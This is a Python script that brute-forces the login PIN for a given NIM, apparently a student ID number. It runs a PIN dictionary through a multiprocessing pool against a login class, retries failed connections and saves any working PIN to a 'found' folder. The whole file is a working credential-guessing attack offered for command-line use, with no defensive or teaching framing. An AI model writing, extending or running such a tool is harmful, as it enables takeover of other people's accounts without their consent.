#!/usr/bin/env python3

import logging
import requests
import time
import os

from SDict import SDict
# from SLogin import SLogin
from ELogin import ELogin
from tqdm import tqdm


class SBrute(object):
    def __init__(self,
                 nim: str,
                 thread: int = 16,
                 disableProgressBar: bool = False,
                 positionProgressBar: int = 0,
                 start: bool = False):

        self.nim = nim
        self.thread = thread
        self.dictionary = SDict(nim)

        self.progressBar = None
        if not disableProgressBar:
            self.progressBar = tqdm(desc=self.nim,
                                    total=len(self.dictionary),
                                    position=positionProgressBar)

        self.found = False
        self.result = []

        if start:
            self.start()

    def login(self,
              pin: str,
              depth: int = 0,
              maxRetry: int = 8):
        try:
            if self.found:
                return
            else:
                with ELogin(self.nim, pin) as conn:
                    if conn.login():
                        self.found = True
                        return pin
        except (requests.ConnectTimeout,
                requests.ConnectionError,
                requests.exceptions.ChunkedEncodingError) as ex:
            logging.debug('{} occured {} {}, {} of {} retries'.format(
                str(ex), self.nim, pin, depth, maxRetry))

            if depth < maxRetry:
                return self.login(pin, depth+1, maxRetry)
            else:
                logging.critical(
                    'Max Retry Exceeded for this exception: {}'.format(str(ex)))
                raise ex
        finally:
            if depth == 0 and self.progressBar is not None:
                self.progressBar.update()

    def start(self):
        self.tStart = time.time()

        try:
            # check saved pin first
            try:
                filename = 'found/{}'.format(self.nim)
                with open(filename, 'r') as f:
                    pin = f.read()
                    logging.info(
                        'Saved pin found for {}, trying it.'.format(self.nim))
            except FileNotFoundError:
                pass
            else:
                self.result.append(self.login(pin, depth=1))
                if self.result == pin:
                    logging.info('Saved pin is good.')
                else:
                    logging.warning('Saved pin is bad, trying normal method.')
                    os.remove(filename)

            try:
                from multiprocessing import Pool

                with Pool(self.thread) as pool:
                    self.result += pool.map(self.login, self.dictionary)

            except ImportError:
                from multiprocessing.dummy import Pool

                with Pool(self.thread) as pool:
                    self.result += pool.map(self.login, self.dictionary)

            self.result = list(set(self.result))
            self.result.remove(None)
        finally:
            self.tEnd = time.time()

            if self.found and self.result is not None:
                with open('found/{}'.format(self.nim), 'w') as logfile:
                    logfile.write(self.result[0])
                logmsg = 'FOUND {} {}'.format(self.nim, self.result[0])
            else:
                logmsg = 'FAILED {}' .format(self.nim)
            logging.info('{} in {:.2f}s'.format(
                logmsg, self.tEnd - self.tStart))


def init_logging(logFileName: str = '', debug: bool = False):
    logFormatter = logging.Formatter(
        fmt="[%(asctime)s][%(levelname)s] %(message)s",
        datefmt='%d-%b-%y %H:%M:%S')

    rootLogger = logging.getLogger()

    consoleHandler = logging.StreamHandler()
    consoleHandler.setFormatter(logFormatter)
    rootLogger.addHandler(consoleHandler)

    rootLogger.setLevel(logging.DEBUG if debug else logging.INFO)


if __name__ == "__main__":
    import argparse
    import time

    parser = argparse.ArgumentParser()
    parser.add_argument("nim", help="NIM to try login")
    args = parser.parse_args()

    conn = SBrute(args.nim, start=False, disableProgressBar=False)

    tStart = time.time()
    conn.start()
    tEnd = time.time()
    print("Completed in: {:0.2f}".format(tEnd-tStart))
